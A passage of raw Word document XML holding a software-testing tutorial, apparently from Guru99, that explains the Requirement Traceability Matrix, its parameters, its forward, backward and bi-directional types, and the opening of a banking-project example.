    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="718" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="719" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Requirement Traceability Matrix or RTM captures all requirements proposed by the client or software development team and their traceability in a single document delivered at the conclusion of the life-cycle.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="720" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="721" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">In other words, it is a document that </w:t>
        </w:r>
        <w:r w:rsidRPr="00DA065E">
          <w:rPr>
            <w:b/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>maps and traces user requirement with test cases</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>. The main purpose of Requirement Traceability Matrix is to see that all test cases are covered so that no functionality should miss while doing Software testing.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="722" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="723" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Requirement Traceability Matrix – Parameters include</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="724" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="725" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Requirement ID</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="726" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="727" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Risks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="728" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="729" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Requirement Type and Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="730" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="731" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Trace to design specification</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="732" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="733" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Unit test cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="734" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="735" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Integration test cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="736" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="737" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>System test cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="738" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="739" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>User acceptance test cases</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="119"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="740" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="741" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Trace to test script</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="276" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="742" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="743" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Types of Traceability Test Matrix</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="120"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="744" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="745" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Forward traceability</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: This matrix is used to check whether the project progresses in the desired direction and for the right product. It makes sure that each requirement is applied to the product and that each requirement is tested thoroughly. It maps requirements to test cases.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="746" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="747" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="120"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="748" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="749" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Backward or reverse traceability:</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> It is used to ensure whether the current product remains on the right track. The purpose behind this type of traceability is to verify that we are not expanding the scope of the project by adding code, design elements, test or other work that is not specified in the requirements. It maps test cases to requirements.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00D75A7E" w:rsidRPr="00D75A7E" w:rsidRDefault="00D75A7E" w:rsidP="00D75A7E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="120"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="750" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="751" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Bi-directional traceability </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">( </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Forward</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>+Backward</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>): </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>This traceability metrics ensures that all requirements are covered by test cases. It analyzes the impact of a change in requirements affected by the</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/the-unconventional-guide-to-defect-management.html" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Defect </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>in a work product and vice versa.  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="276" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="752" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="753" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>How to create Requirement Traceability Matrix</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="754" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="755" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let's understand the concept of Requirement Traceability Matrix through a Guru99 banking project.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="756" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="757" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>On the basis of </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Business Requirement Document (BRD)</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> and </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Technical Requirement Document (TRD)</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>, testers start writing test cases.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="758" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="759" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let suppose, the following table is our Business Requirement Document or </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://docs.google.com/document/d/1FsLnZ4thNQF0MhFIFw2Q1KzOTAX89MB8BCvnpsPu5Lc/edit?usp=sharing" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>BRD</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> for </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
